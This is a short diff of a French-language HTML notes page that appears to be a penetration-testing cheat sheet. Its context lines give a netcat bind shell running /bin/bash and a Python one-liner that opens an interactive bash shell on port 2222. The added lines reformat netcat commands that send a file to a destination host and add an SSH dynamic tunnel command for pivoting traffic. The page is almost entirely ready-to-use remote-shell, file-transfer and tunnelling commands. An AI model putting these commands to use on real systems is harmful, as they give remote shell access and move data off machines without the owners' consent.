@@ -3,8 +3,12 @@
   <li>nc -lvp 2222 -e /bin/bash</li>
   <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</li>
 </ul>
-On se connecte avec nc -nv 2222 adress port
+On se connecte avec nc -nv 2222 adress port</br>
 
-Envoi fichier :
-nc -l -p 1234 > out.file
-nc -w 3 [destination] 1234 < out.file
+Envoi fichier :</br>
+nc -l -p 1234 > out.file</br>
+nc -w 3 [destination] 1234 < out.file</br>
+
+
+Tunnel ssh dynamique sur le port local 8080:</br>
+ssh -ND 8080 root@addressIP</br>
